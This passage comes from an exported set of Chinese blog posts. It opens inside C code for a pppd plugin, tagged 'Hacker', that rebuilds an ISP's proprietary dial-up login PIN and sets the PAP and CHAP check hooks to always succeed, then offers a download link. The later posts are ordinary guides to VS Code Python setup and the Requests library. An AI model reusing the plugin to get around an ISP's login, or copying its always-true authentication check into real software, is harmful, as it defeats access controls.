<span class="built_in">printf</span>(<span class="string">"%d %s\n"</span>,i,beforeMD5);</span><br><span class="line">    MD5_Final (afterMD5, &amp;md5);</span><br><span class="line"></span><br><span class="line">    MD501H[<span class="number">0</span>] = afterMD5[<span class="number">0</span>] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>;</span><br><span class="line">    MD501H[<span class="number">1</span>] = afterMD5[<span class="number">0</span>] &amp; <span class="number">0xF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(MD501,<span class="string">"%x%x"</span>,MD501H[<span class="number">0</span>],MD501H[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        temp[i] = timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] &amp; <span class="number">1</span>;</span><br><span class="line">        timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] = timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        timeHash[i] = temp[i] * <span class="number">128</span> + temp[<span class="number">4</span> + i] * <span class="number">64</span> + temp[<span class="number">8</span> + i]</span><br><span class="line">            * <span class="number">32</span> + temp[<span class="number">12</span> + i] * <span class="number">16</span> + temp[<span class="number">16</span> + i] * <span class="number">8</span> + temp[<span class="number">20</span> + i]</span><br><span class="line">            * <span class="number">4</span> + temp[<span class="number">24</span> + i] * <span class="number">2</span> + temp[<span class="number">28</span> + i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp[<span class="number">1</span>] = (timeHash[<span class="number">0</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    temp[<span class="number">0</span>] = (timeHash[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">    temp[<span class="number">2</span>] = (timeHash[<span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    temp[<span class="number">1</span>] = (timeHash[<span class="number">1</span>] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>) + temp[<span class="number">1</span>];</span><br><span class="line">    temp[<span class="number">3</span>] = timeHash[<span class="number">2</span>] &amp; <span class="number">0x3F</span>;</span><br><span class="line">    temp[<span class="number">2</span>] = ((timeHash[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3</span>) + temp[<span class="number">2</span>];</span><br><span class="line">    temp[<span class="number">5</span>] = (timeHash[<span class="number">3</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    temp[<span class="number">4</span>] = (timeHash[<span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        PIN27[i] = temp[i] + <span class="number">0x020</span>;</span><br><span class="line">        <span class="keyword">if</span>(PIN27[i]&gt;=<span class="number">0x40</span>) &#123;</span><br><span class="line">            PIN27[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIN[<span class="number">0</span>] = <span class="string">'\r'</span>;</span><br><span class="line">    PIN[<span class="number">1</span>] = <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(PIN+<span class="number">2</span>, PIN27, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    PIN[<span class="number">8</span>] = MD501[<span class="number">0</span>];</span><br><span class="line">    PIN[<span class="number">9</span>] = MD501[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(PIN+<span class="number">10</span>, userName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pap_modifyusername</span><span class="params">(<span class="keyword">char</span> *user, <span class="keyword">char</span>* passwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    byte PIN[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    getPIN(saveuser, PIN);</span><br><span class="line">    <span class="built_in">strcpy</span>(user, PIN);</span><br><span class="line">    info(<span class="string">"sxplugin : user  is %s "</span>,user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">plugin_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info(<span class="string">"sxplugin : init"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(saveuser,user);</span><br><span class="line">    <span class="built_in">strcpy</span>(savepwd,passwd);</span><br><span class="line">    pap_modifyusername(user, saveuser);</span><br><span class="line">    info(<span class="string">"sxplugin : passwd loaded"</span>);</span><br><span class="line">    pap_check_hook=check;</span><br><span class="line">    chap_check_hook=check;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="◆下载地址"><a href="#◆下载地址" class="headerlink" title="◆下载地址"></a>◆下载地址</h1><p><a href="http://cloud.189.cn/t/umuUBrQNNRfi" target="_blank" rel="noopener">  (访问码:4854)</a></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual Studio Code配置Python开发环境</title>
    <url>/2016/06/29/Visual-Studio-Code%E9%85%8D%E7%BD%AEPython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html</url>
    <content><![CDATA[<h1 id="1-安装Python插件"><a href="#1-安装Python插件" class="headerlink" title="1.安装Python插件"></a>1.安装Python插件</h1><p>在VScode界面按<code>Crtl</code>+<code>Shift</code>+<code>P</code>或者<code>F1</code></p>
<p>输入<code>ext install</code></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/ext%20install.png" alt="ext install"></p>
<p>直接安装<code>Python</code>，也就是点击它，然后等待，安装好后会提示你重启<br><a id="more"></a></p>
<h1 id="2-配置运行Python程序"><a href="#2-配置运行Python程序" class="headerlink" title="2.配置运行Python程序"></a>2.配置运行Python程序</h1><p>同样的打开命令面板（<code>Crtl</code>+<code>Shift</code>+<code>P</code>或<code>F1</code>），然后输入<code>Tasks: Configure Task Runner</code>（中文输入：任务，然后选择任务：配置任务运行程序），选择<code>Other</code></p>
<p>此时VScode会自动生成.vscode文件夹并生成一个默认的task.json</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/vscode-tasks.json.png" alt="tasks.json"></p>
<p>配置如下</p>
<pre><code>&quot;version&quot;: &quot;0.1.0&quot;,
&quot;command&quot;: &quot;python&quot;,
&quot;isShellCommand&quot;: true,
&quot;args&quot;: [&quot;${file}&quot;],
&quot;showOutput&quot;: &quot;always&quot;
</code></pre><p>然后写完代码后<br><code>Crtl</code>+<code>Shift</code>+<code>B</code>运行Py程序<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/VScode-python-run.png" alt="python-run"></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Python之Requests的高级用法</title>
    <url>/2016/06/10/Python%E4%B9%8BRequests%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95.html</url>
    <content><![CDATA[<hr>
<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><hr>
<p>本篇文档涵盖了Requests的一些更加高级的特性。</p>
<hr>
<h2 id="会话对象"><a href="#会话对象" class="headerlink" title="会话对象"></a>会话对象</h2><hr>
<p>会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。</p>
<p>会话对象具有主要的Requests API的所有方法。</p>
<p>我们来跨请求保持一些cookies:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.get(<span class="string">'http://httpbin.org/cookies/set/sessioncookie/123456789'</span>)</span><br><span class="line">r = s.get(<span class="string">"http://httpbin.org/cookies"</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"><span class="comment"># '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;'</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.auth = (<span class="string">'user'</span>, <span class="string">'pass'</span>)</span><br><span class="line">s.headers.update(&#123;<span class="string">'x-test'</span>: <span class="string">'true'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># both 'x-test' and 'x-test2' are sent</span></span><br><span class="line">s.get(<span class="string">'http://httpbin.org/headers'</span>, headers=&#123;<span class="string">'x-test2'</span>: <span class="string">'true'</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。</p>
<blockquote>
<p><strong>从字典参数中移除一个值</strong><br>有时你会想省略字典参数中一些会话层的键。要做到这一点，你只需简单地在方法层参数中将那个键的值设置为 None ，那个键就会被自动省略掉。</p>
</blockquote>
<p>包含在一个会话中的所有数据你都可以直接使用。学习更多细节请阅读 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#sessionapi" target="_blank" rel="noopener">会话API文档</a> 。</p>
<hr>
<h2 id="请求与响应对象"><a href="#请求与响应对象" class="headerlink" title="请求与响应对象"></a>请求与响应对象</h2><hr>
<p>任何时候调用requests.*()你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从 服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息， 也包含你原来创建的 Request 对象。如下是一个简单的请求，从Wikipedia的服务器得到 一些非常重要的信息:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://en.wikipedia.org/wiki/Monty_Python'</span>)</span><br></pre></td></tr></table></figure>
<p>如果想访问服务器返回给我们的响应头部信息，可以这样做:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</span><br><span class="line">&#123;<span class="string">'content-length'</span>: <span class="string">'56170'</span>, <span class="string">'x-content-type-options'</span>: <span class="string">'nosniff'</span>, <span class="string">'x-cache'</span>:</span><br><span class="line"><span class="string">'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet'</span>, <span class="string">'content-encoding'</span>:</span><br><span class="line"><span class="string">'gzip'</span>, <span class="string">'age'</span>: <span class="string">'3080'</span>, <span class="string">'content-language'</span>: <span class="string">'en'</span>, <span class="string">'vary'</span>: <span class="string">'Accept-Encoding,Cookie'</span>,</span><br><span class="line"><span class="string">'server'</span>: <span class="string">'Apache'</span>, <span class="string">'last-modified'</span>: <span class="string">'Wed, 13 Jun 2012 01:33:50 GMT'</span>,</span><br><span class="line"><span class="string">'connection'</span>: <span class="string">'close'</span>, <span class="string">'cache-control'</span>: <span class="string">'private, s-maxage=0, max-age=0,</span></span><br><span class="line"><span class="string">must-revalidate'</span>, <span class="string">'date'</span>: <span class="string">'Thu, 14 Jun 2012 12:59:39 GMT'</span>, <span class="string">'content-type'</span>:</span><br><span class="line"><span class="string">'text/html; charset=UTF-8'</span>, <span class="string">'x-cache-lookup'</span>: <span class="string">'HIT from cp1006.eqiad.wmnet:3128,</span></span><br><span class="line"><span class="string">MISS from cp1010.eqiad.wmnet:80'</span>&#125;</span><br></pre></td></tr></table></figure>
<p>然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.request.headers</span><br><span class="line">&#123;<span class="string">'Accept-Encoding'</span>: <span class="string">'identity, deflate, compress, gzip'</span>,</span><br><span class="line"><span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/0.13.1'</span>&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Prepared-Request"><a href="#Prepared-Request" class="headerlink" title="Prepared Request"></a>Prepared Request</h2><hr>
<p>当你从API调用或Session调用得到一个<a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response" target="_blank" rel="noopener">Response</a>对象，对于这个的request属性实际上是被使用的PreparedRequest，在某些情况下你可能希望在发送请求之前对body和headers(或其他东西)做些额外的工作，一个简单的例子如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">'GET'</span>, url,</span><br><span class="line">    data=data,</span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line">prepped = req.prepare()</span><br><span class="line"></span><br><span class="line"><span class="comment"># do something with prepped.body</span></span><br><span class="line"><span class="comment"># do something with prepped.headers</span></span><br><span class="line"></span><br><span class="line">resp = s.send(prepped,</span><br><span class="line">    stream=stream,</span><br><span class="line">    verify=verify,</span><br><span class="line">    proxies=proxies,</span><br><span class="line">    cert=cert,</span><br><span class="line">    timeout=timeout</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(resp.status_code)</span><br></pre></td></tr></table></figure>
<p>因为你没有用Request对象做任何特别的事情，你应该立即封装它和修改 PreparedRequest 对象，然后携带着你想要发送到requests.<em> 或 Session.</em>的其他参数来发送它</p>
<p>但是，上面的代码会丧失一些Requests Session对象的优势，特别的，Session层的状态比如cookies不会被应用到你的其他请求中，要使它得到应用，你可以用<em>Session.prepare_request()</em>来替换 <em>Request.prepare()</em>，比如下面的例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">'GET'</span>,  url,</span><br><span class="line">    data=data</span><br><span class="line">    headers=headers</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">prepped = s.prepare_request(req)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do something with prepped.body</span></span><br><span class="line"><span class="comment"># do something with prepped.headers</span></span><br><span class="line"></span><br><span class="line">resp = s.send(prepped,</span><br><span class="line">    stream=stream,</span><br><span class="line">    verify=verify,</span><br><span class="line">    proxies=proxies,</span><br><span class="line">    cert=cert,</span><br><span class="line">    timeout=timeout</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(resp.status_code)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h2><hr>
<p>Requests可以为HTTPS请求验证SSL证书，就像web浏览器一样。要想检查某个主机的SSL证书，你可以使用 verify 参数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">True</span>)</span><br><span class="line">requests.exceptions.SSLError: hostname <span class="string">'kennethreitz.com'</span> doesn<span class="string">'t match either of '</span>*.herokuapp.com<span class="string">', '</span>herokuapp.com<span class="string">'</span></span><br></pre></td></tr></table></figure>
<p>在该域名上我没有设置SSL，所以失败了。但Github设置了SSL:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="keyword">True</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<p>对于私有证书，你也可以传递一个<em>CA_BUNDLE</em>文件的路径给 <strong>verify</strong> 。你也可以设置 <em>REQUEST_CA_BUNDLE</em> 环境变量。</p>
<p>如果你将<strong>verify</strong>设置为<strong>False</strong>，Requests也能<strong>忽略</strong>对SSL证书的验证。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<p><strong>默认</strong>情况下， <strong>verify</strong> 是设置为<strong>True</strong>的。选项 verify 仅应用于主机证书。</p>
<p>你也可以指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=(<span class="string">'/path/server.crt'</span>, <span class="string">'/path/key'</span>))</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<p>如果你指定了一个错误路径或一个无效的证书:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=<span class="string">'/wrong_path/server.pem'</span>)</span><br><span class="line">SSLError: [Errno <span class="number">336265225</span>] _ssl.c:<span class="number">347</span>: error:<span class="number">140</span>B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="响应体内容工作流"><a href="#响应体内容工作流" class="headerlink" title="响应体内容工作流"></a>响应体内容工作流</h2><hr>
<p>默认情况下，当你进行网络请求后，响应体会<strong>立即</strong>被下载。你可以通过 <strong>stream</strong> 参数覆盖这个行为，<strong>推迟</strong>下载响应体直到访问 <strong>Response.content</strong> 属性:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tarball_url = <span class="string">'https://github.com/kennethreitz/requests/tarball/master'</span></span><br><span class="line">r = requests.get(tarball_url, stream=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
<p>此时仅有响应头被下载下来了，<strong>连接保持打开状态</strong>，因此允许我们根据条件获取内容:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> int(r.headers[<span class="string">'content-length'</span>]) &lt; TOO_LONG:</span><br><span class="line">    content = r.content</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>你可以进一步使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_content" target="_blank" rel="noopener">Response.iter_content</a> 和 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="noopener">Response.iter_lines</a> 方法来控制工作流，或者以 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.raw" target="_blank" rel="noopener">Response.raw</a> 从底层urllib3的 urllib3.HTTPResponse &lt;urllib3.response.HTTPResponse 读取。</p>
<p>如果当你请求时设置<strong>stream</strong>为<strong>True</strong>，Requests将不能释放这个连接为连接池，除非你读取了全部数据或者调用了<strong>Response.close</strong>，这样会使连接变得低效率。如果当你设置 <strong>stream = True</strong> 时你发现你自己部分地读取了响应体数据(或者完全没读取响应体数据)，你应该考虑使用<a href="http://docs.python.org/2/library/contextlib.html#contextlib.closing" target="_blank" rel="noopener"><strong><em>contextlib.closing</em></strong></a>,比如下面的例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> closing(requests.get(<span class="string">'http://httpbin.org/get'</span>, stream=<span class="keyword">True</span>)) <span class="keyword">as</span> r:</span><br><span class="line">    <span class="comment"># Do things with the response here.</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="保持活动状态（持久连接）"><a href="#保持活动状态（持久连接）" class="headerlink" title="保持活动状态（持久连接）"></a>保持活动状态（持久连接）</h2><hr>
<p>好消息 - 归功于urllib3，<strong>同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！</strong></p>
<blockquote>
<p><strong>注意</strong>：只有所有的响应体数据被读取完毕连接才会被释放为连接池；所以确保将 <strong>stream</strong> 设置为 <strong>False</strong> 或读取 <strong>Response</strong> 对象的 <strong>content</strong> 属性。</p>
</blockquote>
<hr>
<h2 id="流式上传"><a href="#流式上传" class="headerlink" title="流式上传"></a>流式上传</h2><hr>
<p>Requests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'massive-body'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    requests.post(<span class="string">'http://some.url/streamed'</span>, data=f)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="块编码请求"><a href="#块编码请求" class="headerlink" title="块编码请求"></a>块编码请求</h2><hr>
<p>对于出去和进来的请求，Requests也支持分块传输编码。要发送一个块编码的请求，仅需为你的请求体提供一个生成器（或任意没有具体长度(without a length)的迭代器）:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">'hi'</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">'there'</span></span><br><span class="line"></span><br><span class="line">requests.post(<span class="string">'http://some.url/chunked'</span>, data=gen())</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="POST-多个编码-Multipart-Encoded-文件"><a href="#POST-多个编码-Multipart-Encoded-文件" class="headerlink" title="POST 多个编码(Multipart-Encoded)文件"></a>POST 多个编码(Multipart-Encoded)文件</h2><hr>
<p>你可以在一个请求中发送多个文件，例如，假设你希望上传图像文件到一个包含多个文件字段‘images’的HTML表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”file”</span> <span class="attr">name</span>=<span class="string">”images”</span> <span class="attr">multiple</span>=<span class="string">”true”</span> <span class="attr">required</span>=<span class="string">”true”/</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>达到这个目的，仅仅只需要设置文件到一个包含(<em>form_field_name</em>, <em>file_info</em>)的元组的<strong>列表</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>multiple_files = [(<span class="string">'images'</span>, (<span class="string">'foo.png'</span>, open(<span class="string">'foo.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>)),</span><br><span class="line">                      (<span class="string">'images'</span>, (<span class="string">'bar.png'</span>, open(<span class="string">'bar.png'</span>, <span class="string">'rb'</span>), <span class="string">'image/png'</span>))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=multiple_files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">'files'</span>: &#123;<span class="string">'images'</span>: <span class="string">'data:image/png;base64,iVBORw ....'</span>&#125;</span><br><span class="line">  <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a'</span>,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="事件挂钩"><a href="#事件挂钩" class="headerlink" title="事件挂钩"></a>事件挂钩</h2><hr>
<p>Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理。</p>
<p>可用的钩子:</p>
<p><em>response:</em></p>
<p>  从一个请求产生的响应</p>
<p>你可以通过传递一个 <em>{hook_name: callback_function}</em> 字典给 hooks 请求参数 为每个请求分配一个钩子函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hooks=dict(response=print_url)</span><br></pre></td></tr></table></figure>
<p><em>callback_function</em> 会接受一个数据块作为它的第一个参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_url</span><span class="params">(r)</span>:</span></span><br><span class="line">    print(r.url)</span><br></pre></td></tr></table></figure>
<p>若执行你的回调函数期间发生错误，系统会给出一个警告。</p>
<p>若回调函数返回一个值，默认以该值替换传进来的数据。若函数未返回任何东西， 也没有什么其他的影响。</p>
<p>我们来在运行期间打印一些请求方法的参数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://httpbin.org'</span>, hooks=dict(response=print_url))</span><br><span class="line">http://httpbin.org</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="自定义身份验证"><a href="#自定义身份验证" class="headerlink" title="自定义身份验证"></a>自定义身份验证</h2><hr>
<p>Requests允许你使用自己指定的身份验证机制。</p>
<p>任何传递给请求方法的 <strong><em>auth</em></strong> 参数的可调用对象，在请求发出之前都有机会修改请求。</p>
<p>自定义的身份验证机制是作为 <em>requests.auth.AuthBase</em> 的子类来实现的，也非常容易定义。</p>
<p>Requests在 <em>requests.auth</em> 中提供了两种常见的的身份验证方案： <em>HTTPBasicAuth</em> 和 <em>HTTPDigestAuth</em> 。</p>
<p>假设我们有一个web服务，仅在 X-Pizza 头被设置为一个密码值的情况下才会有响应。虽然这不太可能， 但就以它为例好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> AuthBase</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PizzaAuth</span><span class="params">(AuthBase)</span>:</span></span><br><span class="line">    <span class="string">"""Attaches HTTP Pizza Authentication to the given Request object."""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="comment"># setup any auth-related data here</span></span><br><span class="line">        self.username = username</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, r)</span>:</span></span><br><span class="line">        <span class="comment"># modify and return the request</span></span><br><span class="line">        r.headers[<span class="string">'X-Pizza'</span>] = self.username</span><br><span class="line">        <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure>
<p>然后就可以使用我们的<strong><em>PizzaAuth</em></strong>来进行网络请求:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://pizzabin.org/admin'</span>, auth=PizzaAuth(<span class="string">'kenneth'</span>))</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="流式请求"><a href="#流式请求" class="headerlink" title="流式请求"></a>流式请求</h2><hr>
<p>使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="noopener">requests.Response.iter_lines()</a> 你可以很方便地对流式API（例如 <a href="https://dev.twittercom/docs/streaming-api" target="_blank" rel="noopener">Twitter的流式API</a> ）进行迭代。简单地设置 stream 为 True 便可以使用 <a href="http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines" target="_blank" rel="noopener">iter_lines()</a> 对相应进行迭代:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://httpbin.org/stream/20'</span>, stream=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> r.iter_lines():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># filter out keep-alive new lines</span></span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        print(json.loads(line))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><hr>
<p>如果需要使用代理，你可以通过为任意请求方法提供 <strong><em>proxies</em></strong> 参数来配置单个请求:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">"http"</span>: <span class="string">"http://10.10.1.10:3128"</span>,</span><br><span class="line">  <span class="string">"https"</span>: <span class="string">"http://10.10.1.10:1080"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">"http://example.org"</span>, proxies=proxies)</span><br></pre></td></tr></table></figure>
